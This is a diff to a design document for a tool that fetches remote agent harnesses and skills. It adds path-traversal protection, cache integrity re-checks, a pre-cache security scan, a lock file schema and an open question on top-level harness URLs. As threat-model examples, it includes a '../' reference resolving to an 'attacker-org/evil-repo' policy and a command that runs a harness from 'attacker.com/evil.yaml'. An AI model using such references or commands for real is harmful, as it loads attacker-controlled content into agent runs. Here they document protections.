@@ -104,7 +104,26 @@ For now, the recommended approach is vendoring with lock files for scripts that 
 
 ### Relative Path Resolution for URL-Referenced Resources
 
-When a harness or resource is fetched from a URL, relative paths within that resource are resolved relative to the URL's base path, not the local `.fullsend` directory:
+When a harness or resource is fetched from a URL, relative paths within that resource are resolved relative to the URL's base path, not the local `.fullsend` directory.
+
+**Path traversal protection:** URL-based relative paths follow RFC 3986 semantics, including `../` traversal. Example:
+
+A skill at `https://github.com/fullsend-ai/library/skills/rust/SKILL.md` referencing:
+
+```yaml
+policy: ../../../../attacker-org/evil-repo/policy.yaml
+```
+
+Resolves (after normalization) to: `https://github.com/attacker-org/evil-repo/policy.yaml`
+
+This passes the domain allowlist check (`github.com` is allowed), but **fails** the URL prefix check if `allowed_remote_resources` contains:
+
+```yaml
+allowed_remote_resources:
+  - https://github.com/fullsend-ai/library/
+```
+
+The normalized URL `https://github.com/attacker-org/evil-repo/policy.yaml` does not match prefix `https://github.com/fullsend-ai/library/`, so the fetch is rejected. **The prefix check operates on the normalized URL path** (after resolving `.` and `..`), not the raw reference string. This prevents cross-path traversal attacks.
 
 **Example 1: Harness fetched from URL**
 ```yaml
@@ -871,6 +890,7 @@ import (
 
     "github.com/fullsend-ai/fullsend/internal/fetch"
     "github.com/fullsend-ai/fullsend/internal/harness"
+    "github.com/fullsend-ai/fullsend/internal/security"
 )
 
 type ResolvedHarness struct {
@@ -957,6 +977,12 @@ func resolveResourceWithLimits(ctx context.Context, workspaceRoot, ref string, a
             return "", fmt.Errorf("reading cache for %s: %w", cleanURL, err)
         }
         if content != nil {
+            // Re-verify integrity on cache hit to prevent tampering
+            // Even though cache path includes hash, a compromised process could replace content
+            actualHash := fetch.ComputeSHA256(content)
+            if actualHash != expectedHash {
+                return "", fmt.Errorf("cache integrity check failed for %s: expected %s, got %s (cache may be corrupted or tampered)", cleanURL, expectedHash, actualHash)
+            }
             return filepath.Join(fetch.CachePath(workspaceRoot, expectedHash), "content"), nil
         }
 
@@ -966,13 +992,19 @@ func resolveResourceWithLimits(ctx context.Context, workspaceRoot, ref string, a
             return "", fmt.Errorf("fetching %s: %w", cleanURL, err)
         }
 
+        // Security scan BEFORE integrity check and caching
+        // This ensures malicious content is never written to cache
+        if err := security.ScanResource(content, security.RemoteResourcePolicy); err != nil {
+            return "", fmt.Errorf("security scan failed for %s: %w", cleanURL, err)
+        }
+
         // Verify integrity hash (hasHash is guaranteed to be true here)
         actualHash := fetch.ComputeSHA256(content)
         if actualHash != expectedHash {
             return "", fmt.Errorf("integrity hash mismatch for %s: expected %s, got %s", cleanURL, expectedHash, actualHash)
         }
 
-        // Store in cache
+        // Store in cache (only after scan and integrity verification pass)
         if err := fetch.CachePut(workspaceRoot, cleanURL, content); err != nil {
             return "", fmt.Errorf("caching %s: %w", cleanURL, err)
         }
@@ -1155,9 +1187,12 @@ if offline && hasRemoteReferences(h) {
 - Support URLs for agents, skills, policies (declarative resources only)
 - Require all URL references to be declared in `allowed_remote_resources`
 - No runtime fetch—all resources resolved at harness load time
-- No transitive dependency resolution yet (skills cannot reference other skills)
+- **No transitive dependency resolution** (skills/policies cannot themselves reference URL-based dependencies)
+- **No cycle detection needed** — only single-level references are supported (harness → resource, but resource cannot → another resource)
 
 **Deliverable:** `fullsend run` can load a harness that references `agent: https://...#sha256=abc123...`
+
+**Scope limitation:** URL-referenced resources in Phase 1 are treated as leaf nodes. They cannot contain URL references to other resources. This simplifies implementation and defers dependency graph complexity to Phase 2.
 
 ### Phase 2: Transitive dependency resolution
 
@@ -1170,11 +1205,46 @@ if offline && hasRemoteReferences(h) {
 
 ### Phase 3: Lock files for transitive dependencies
 
-- Generate `harness.lock` file that pins all transitive dependencies (URLs and hashes)
+- Generate `.fullsend/lock.yaml` file that pins all transitive dependencies (URLs and hashes)
 - Lock file ensures reproducible builds across environments
 - Warn when harness references change but lock file is not updated
 
 **Deliverable:** `fullsend lock harness/code.yaml` generates a lock file with all resolved dependencies
+
+**Strawman lock file schema (`.fullsend/lock.yaml`):**
+
+```yaml
+# Generated by fullsend lock harness/code.yaml
+# DO NOT EDIT - This file is auto-generated
+version: 1
+generated_at: "2026-05-12T14:30:00Z"
+
+harnesses:
+  code:
+    source: harness/code.yaml
+    sha256: "abc123..."  # hash of the harness file itself
+    dependencies:
+      agent:
+        url: https://github.com/fullsend-ai/library/agents/code.md
+        sha256: "def456..."
+        resolved_at: "2026-05-12T14:29:55Z"
+      policy:
+        path: policies/local-code-policy.yaml  # local paths recorded for completeness
+        sha256: "789abc..."
+      skills:
+        - url: https://github.com/fullsend-ai/library/skills/rust/SKILL.md
+          sha256: "123def..."
+          resolved_at: "2026-05-12T14:29:56Z"
+          transitive_deps:
+            - url: https://github.com/prodsec/agent-skills/security-baseline.md
+              sha256: "456789..."
+              resolved_at: "2026-05-12T14:29:57Z"
+```
+
+**Interaction with dependency resolution:**
+- On `fullsend run`, if `.fullsend/lock.yaml` exists and contains an entry for the harness, use pinned URLs/hashes from lock file instead of re-resolving
+- If harness YAML references change but lock file is stale, warn: "harness/code.yaml has changed since lock file was generated. Run `fullsend lock harness/code.yaml` to update."
+- `fullsend lock --update` re-resolves all dependencies and updates lock file
 
 ### Phase 4: Runtime dependency loading
 
@@ -1208,7 +1278,20 @@ if offline && hasRemoteReferences(h) {
 
 ## Open Questions
 
-### 1. Signature verification
+### 1. Top-level harness URL protection
+
+When running `fullsend run https://attacker.com/evil.yaml#sha256=abc123`, the global domain allowlist in `config.yaml` (which includes `github.com` by default) is the only protection. Hash pinning prevents silent substitution, but not social engineering—a user can be tricked into pinning malicious content.
+
+**Options:**
+
+- **A: Require explicit confirmation** when the top-level harness is a URL not matching a configured "trusted harness prefixes" list (narrower than the global domain allowlist). User must confirm: "This harness references resources from: [domain list]. Continue? [y/N]"
+- **B: Refuse URL-based top-level harnesses** unless they match org-level `allowed_harness_prefixes` (separate from `allowed_remote_resources`). Force users to add trusted harness sources explicitly.
+- **C: Display content summary before execution:** Show all resources referenced, domains accessed, and commands that will run. User must review and confirm.
+- **D: No additional protection** — rely on hash pinning and user vigilance. Document best practices for verifying harness content before use.
+
+**Recommendation:** Option A provides a middle ground — low friction for trusted sources, explicit confirmation for external sources. Prevents drive-by attacks while preserving ease of use.
+
+### 2. Signature verification
 
 Should remote resources be cryptographically signed by their publisher?
 
@@ -1258,15 +1341,6 @@ The cache grows unbounded. When should cached resources be evicted?
 - **C: Manual.** `fullsend cache clean` command to clear cache.
 
 **Recommendation:** C (Manual eviction). Since all remote resources require hash pinning, cached entries are content-addressed and immutable. Eviction should be storage-bounded (e.g., `fullsend cache clean --max-size 1GB`) rather than TTL-based. Add `fullsend cache clean` for manual eviction.
-
-### 5. Offline mode semantics
-
-If `--offline` is set and a harness references a URL, should the runner:
-
-**A:** Fail immediately (strict offline mode)
-**B:** Use cached version if available, fail if not cached
-
-**Recommendation:** B. Offline mode allows cache hits. This supports CI environments with intermittent internet.
 
 ## Related Documents
 
